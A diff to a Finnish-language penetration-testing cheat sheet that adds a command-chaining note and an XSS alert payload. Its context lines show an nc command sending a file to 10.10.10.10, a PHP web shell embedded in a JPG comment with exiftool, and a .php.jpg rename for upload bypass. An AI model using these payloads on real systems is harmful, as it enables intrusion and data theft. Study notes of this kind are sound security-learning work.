@@ -69,6 +69,7 @@ history							<--->	Nayttaa vanhat kommennot
 which bash						<--->	Mista bash ajetaan
 env							<--->	bash scriptiin tietoja koneesta
 
+&&  <---> voi ketjuttaa komentoja
 "|" putki merkki					<--->	Liimataan komentoja 
 | grep haku						<--->	Hakee tietueesta hakusanalla
 | grep -ir haku						<--->	Haku paremmalla rivityksella
@@ -822,6 +823,7 @@ nc 10.10.10.10 5333 < downloadfile.txt                                          
 exiftool -Comment='<?php echo "<pre>"; system($_GET['fun']); ?>' silver.jpg	<--->	JPG kuva php funktiolla
 mv silver.jpg silver.php.jpg							<--->	Nimen vaihto .php.jpg tiedostoksi
 
+XSS <---> <script>alert(document.domain)</script>
 ________________________________________________________________________________________________________________________________
 ** PrivEsc **
 LinPeas								<--->	PrivEsc scanneri
